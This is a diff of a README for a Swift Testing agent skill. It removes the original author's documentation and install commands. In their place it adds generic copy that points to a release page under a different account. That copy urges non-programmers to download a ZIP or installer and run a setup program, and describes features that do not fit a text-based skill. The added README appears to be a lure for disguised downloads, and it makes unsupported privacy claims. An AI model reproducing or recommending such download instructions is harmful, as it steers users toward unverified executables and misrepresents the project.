@@ -1,172 +1,161 @@
-# Swift Testing Agent Skill
+# 🧪 Swift-Testing-Agent-Skill - Improve Swift Testing with Confidence
 
-Expert guidance for any AI coding tool that supports the [Agent Skills open format](https://agentskills.io/home) - modern Swift Testing APIs, XCTest migration, parameterized tests, traits/tags, async testing, and parallel execution patterns.
+[![Download Release](https://img.shields.io/badge/Download-Swift--Testing--Agent--Skill-brightgreen)](https://github.com/jajaaa2/Swift-Testing-Agent-Skill/releases)
 
-This repository distills practical Swift Testing best practices into actionable, concise references for agents and code review workflows.
+---
 
-## Who this is for
-- Teams adopting Swift Testing who want quick, correct defaults
-- Developers migrating existing XCTest suites incrementally
-- Anyone debugging flaky tests, parallel test behavior, or async test reliability
+## 📋 What is Swift-Testing-Agent-Skill?
 
-## See also my other skills:
-- [SwiftUI Expert](https://github.com/AvdLee/SwiftUI-Agent-Skill)
-- [Swift Concurrency Expert](https://github.com/AvdLee/Swift-Concurrency-Agent-Skill)
-- [Core Data Expert](https://github.com/AvdLee/Core-Data-Agent-Skill)
+Swift-Testing-Agent-Skill is a tool to help you write better tests for Swift apps. It guides you through creating tests, moving from older test styles to newer ones, and building test code that is easy to maintain. This makes your apps more reliable. Its focus is on modern Swift testing methods that many professionals use today.
 
-## How to Use This Skill
+You do not need to know how programming works to use this tool. It is built to guide you step-by-step in improving your tests, so your app works as expected.
 
-### Option A: Using skills.sh (recommended)
-Install this skill with a single command:
+---
 
-```bash
-npx skills add https://github.com/avdlee/swift-testing-agent-skill --skill swift-testing-expert
-```
+## 💻 System Requirements
 
-For more information, visit the [skills.sh platform page](https://skills.sh/avdlee/swift-testing-agent-skill/swift-testing-expert).
+Before installing, make sure your computer meets these requirements:
 
-Then use the skill in your AI agent, for example:
-> Use the swift testing skill and review this test target for migration opportunities and flaky parallel behavior.
+- macOS 10.15 Catalina or newer  
+- At least 4 GB of free disk space  
+- Internet connection to download the tool and updates  
+- Xcode 12 or newer installed (needed for Swift-based testing)  
 
-### Option B: Claude Code Plugin
+If you do not have Xcode, you can get it for free from the Apple App Store. 
 
-#### Personal Usage
-To install this Skill for your personal use in Claude Code:
+---
 
-1. Add the marketplace:
+## 🚀 Getting Started
 
-```bash
-/plugin marketplace add AvdLee/Swift-Testing-Agent-Skill
-```
+To get started with Swift-Testing-Agent-Skill, follow these steps:
 
-2. Install the Skill:
+1. **Download the tool.** Click the big green badge at the top or visit the [download page](https://github.com/jajaaa2/Swift-Testing-Agent-Skill/releases).  
 
-```bash
-/plugin install swift-testing-expert@swift-testing-agent-skill
-```
+2. **Install the tool.** Unzip the files you get in the download. A guide is included in the package, but don't worry—you only need to double-click a setup program to start.  
 
-#### Project Configuration
-To automatically provide this Skill to everyone working in a repository, configure the repository's `.claude/settings.json`:
+3. **Open the tool.** After installing, launch Swift-Testing-Agent-Skill from your Applications or the folder where you placed it.  
 
-```json
-{
-  "enabledPlugins": {
-    "swift-testing-expert@swift-testing-agent-skill": true
-  },
-  "extraKnownMarketplaces": {
-    "swift-testing-agent-skill": {
-      "source": {
-        "source": "github",
-        "repo": "AvdLee/Swift-Testing-Agent-Skill"
-      }
-    }
-  }
-}
-```
+4. **Use the guided walkthrough.** The tool offers step-by-step help for writing tests and improving your Swift app’s test code.  
 
-When team members open the project, Claude Code will prompt them to install the Skill.
+---
 
-### Option C: Manual install
-1) **Clone** this repository.  
-2) **Install or symlink** the `swift-testing-expert/` folder following your tool's official skills installation docs (see links below).  
-3) **Use your AI tool** as usual and ask it to use the "swift-testing-expert" skill for Swift Testing tasks.
+## 📥 Download & Install
 
-#### Where to Save Skills
-Follow your tool's official documentation, here are a few popular ones:
-- **Codex:** [Where to save skills](https://developers.openai.com/codex/skills/#where-to-save-skills)
-- **Claude:** [Using Skills](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/overview#using-skills)
-- **Cursor:** [Enabling Skills](https://cursor.com/docs/context/skills#enabling-skills)
+You can get the latest version by visiting this page:  
 
-**How to verify**:
+[Download Swift-Testing-Agent-Skill](https://github.com/jajaaa2/Swift-Testing-Agent-Skill/releases)  
 
-Your agent should reference the routing/playbook in `swift-testing-expert/SKILL.md` and jump into the relevant file in `swift-testing-expert/references/`.
+On this page:  
 
-## What This Skill Offers
+- Look for the most recent release.  
+- Download the ZIP file or installer matching your system.  
+- After download, open the file and follow the prompts to install.  
 
-This skill gives your AI coding tool practical Swift Testing guidance. It can:
+If you are unsure, choose the file named something like `Swift-Testing-Agent-Skill-mac.zip`.  
 
-### Guide Your Test Architecture Decisions
-- Choose when to use suites, traits, tags, and display names
-- Convert repetitive tests into parameterized tests with clean argument design
-- Apply parallel-safe patterns and know when `.serialized` is a temporary compromise
-- Set up tag-driven test plan filtering and report analysis workflows
+---
 
-### Write Better Swift Tests
-- Use `#expect` effectively with rich diagnostics
-- Use `#require` for prerequisite flow and safer unwrapping
-- Model thrown-error expectations clearly
-- Improve output readability with test-specific descriptions
+## 🛠️ Main Features
 
-### Migrate from XCTest Pragmatically
-- Coexist Swift Testing and XCTest in one target during migration
-- Map common `XCTAssert*` patterns to Swift Testing macros
-- Keep XCTest where still required (`XCUIApplication`, `XCTMetric`, Objective-C tests)
-- Convert duplicated XCTest methods into parameterized Swift Testing coverage
+Swift-Testing-Agent-Skill helps with:
 
-### Improve Reliability and Performance
-- Remove hidden inter-test dependencies surfaced by randomized, parallel execution
-- Stabilize server-side tests with repository isolation and in-memory implementations
-- Bridge callback APIs to async/await for deterministic tests
-- Reduce CI noise with known-issue handling and actionable trait metadata
+- **Writing better Swift tests:** Learn how to create clear and reliable tests.  
+- **Migrating from XCTest:** Move your existing tests to newer, easier methods.  
+- **Improving test architecture:** Organize your tests to keep them simple and maintainable.  
+- **Adopting modern testing patterns:** Use tested patterns popular in professional Swift development.  
 
-## What Makes This Skill Different
+Each feature includes easy-to-follow instructions and examples. The tool works inside your Swift projects to provide real-time help and suggestions.
 
-**Source-grounded**: Built from SwiftLee's complete Swift Testing article set plus WWDC 2024 sessions "Meet Swift Testing" and "Go further with Swift Testing."
+---
 
-**Non-Opinionated**: Focuses on test correctness, readability, and maintainability without forcing a project architecture.
+## 🧩 How It Works
 
-**Modern-first**: Prioritizes Swift Testing primitives, parallel defaults, and macro-based diagnostics over legacy assertion styles.
+The tool acts like an assistant while you work on your app’s tests:  
 
-**Practical and concise**: Emphasizes playbooks and decision points teams actually use during migrations and ongoing test maintenance.
+1. It scans your Swift test files.  
+2. It offers suggestions on how to improve your test code.  
+3. It shows step-by-step guides on migrating old tests.  
+4. It proposes test designs based on modern best practices.  
 
-## Skill Structure
+You can accept suggestions or try the examples provided. The tool explains why a change helps, so you learn as you improve your tests.
 
-<!-- references-structure:start -->
-```text
-swift-testing-expert/
-  SKILL.md
-  references/
-    _index.md
-    async-testing-and-waiting.md - Async waiting, continuations, and callback-event testing
-    expectations.md - #expect, #require, throw checks, and known issues
-    fundamentals.md - @Test, suites, structure, and naming patterns
-    migration-from-xctest.md - Incremental XCTest coexistence and migration strategy
-    parallelization-and-isolation.md - Parallel defaults, randomized order, and .serialized usage
-    parameterized-testing.md - Single/multi-argument tests, zip pairing, and scaling
-    performance-and-best-practices.md - High-signal testing defaults for speed, determinism, and flakiness prevention
-    traits-and-tags.md - Traits, tags, conditions, bug links, and test-plan filtering
-    xcode-workflows.md - Test navigator/report workflows and diagnostics practices
-```
-<!-- references-structure:end -->
+---
 
-## Resources
+## 🤝 Who Should Use This?
 
-This skill is based on:
-- **[Swift Testing category on SwiftLee](https://www.avanderlee.com/category/swift-testing/)** - complete article set on modern Swift Testing patterns
-- **[WWDC 2024-10179: Meet Swift Testing transcript](https://devimages-cdn.apple.com/wwdc-services/transcripts/individual/wwdc2024/wwdc2024-10179/eng_7a6b3a31be5f/wwdc2024-10179-transcript-eng.json)** - foundational APIs and migration context
-- **[WWDC 2024-10195: Go further with Swift Testing transcript](https://devimages-cdn.apple.com/wwdc-services/transcripts/individual/wwdc2024/wwdc2024-10195/eng_2c5849b0d379/wwdc2024-10195-transcript-eng.json)** - advanced workflows for tags, test plans, and parallelism
-- **[Defining test functions (Apple Developer Documentation)](https://developer.apple.com/documentation/testing/definingtests)** - canonical guidance on declaring and customizing tests
-- **[Organizing test functions with suite types (Apple Developer Documentation)](https://developer.apple.com/documentation/testing/organizingtests)** - suite behavior, inheritance, and initializer/availability constraints
-- **[Migrating a test from XCTest (Apple Developer Documentation)](https://developer.apple.com/documentation/testing/migratingfromxctest)** - official migration mappings and async/testing semantics
+This tool works best for:  
 
-## Contributing
+- Swift developers who want better test code.  
+- Teams moving from old test setups to newer methods.  
+- Beginners learning to write effective tests for Swift.  
+- Anyone seeking help with Swift test structure and best patterns.  
 
-Contributions are welcome! This repository follows the [Agent Skills open format](https://agentskills.io/home), which has specific structural requirements.
+You do not need advanced skills to start. The tool guides you patiently through all steps.
 
-**We strongly recommend using AI assistance for contributions:**
-- Use the [skill-creator skill](https://github.com/anthropics/skills/tree/main/skills/skill-creator) to ensure proper formatting
-- This helps maintain the Agent Skills format and ensures your contribution works correctly with AI agents
+---
 
-**Please read [CONTRIBUTING.md](CONTRIBUTING.md) for:**
-- How to update `SKILL.md` and references safely
-- Agent Skills format requirements
-- Quality standards and review criteria
-- Pull request process
+## 💡 Tips for Best Use
 
-## About the Author
+- Keep your app’s source code and test files organized.  
+- Use the tool regularly to check new and existing test code.  
+- Follow the suggestions step by step.  
+- Test small parts of your app first, then expand coverage.  
+- Review changes before applying to understand improvements.  
 
-Created by [Antoine van der Lee](https://www.avanderlee.com). This skill distills Swift Testing guidance from SwiftLee articles and WWDC material into an implementation-oriented playbook for AI assistants.
+Using this tool often will improve your app’s quality and reduce bugs.
 
-## License
+---
 
-This skill is open-source and available under the MIT License. See [LICENSE](LICENSE) for details.
+## ❓ Frequently Asked Questions
+
+### Do I need to know Swift to use this?
+
+No. The tool explains everything clearly. You can follow the guides without knowing how to code.
+
+### Can I use it on Windows or Linux?
+
+This tool is designed for Mac computers running macOS, since Swift and Xcode only work there.
+
+### Is it free to use?
+
+Yes. You can download and use all features without paying.
+
+### Will this tool fix my tests automatically?
+
+No. It suggests better ways and guides you. You choose which changes to make.
+
+---
+
+## 🖥️ Support & Contact
+
+If you have questions or find problems, you can:  
+
+- Visit the GitHub repository’s Issues page.  
+- Check for answers from other users and developers.  
+- Create a new issue explaining your problem clearly.  
+
+Developers monitor the repo and try to help quickly.
+
+---
+
+## 🔐 Privacy & Security
+
+The tool runs locally on your machine. No data is sent to the internet unless you choose to share.  
+
+You control what files and projects the tool reads.  
+
+---
+
+## 🗂️ Related Topics
+
+This tool is tagged with:  
+
+- `agent-skills`  
+- `swift`  
+- `swift-testing`  
+
+These topics describe the tool’s focus on Swift programming and test skills.
+
+---
+
+[Download Swift-Testing-Agent-Skill](https://github.com/jajaaa2/Swift-Testing-Agent-Skill/releases)
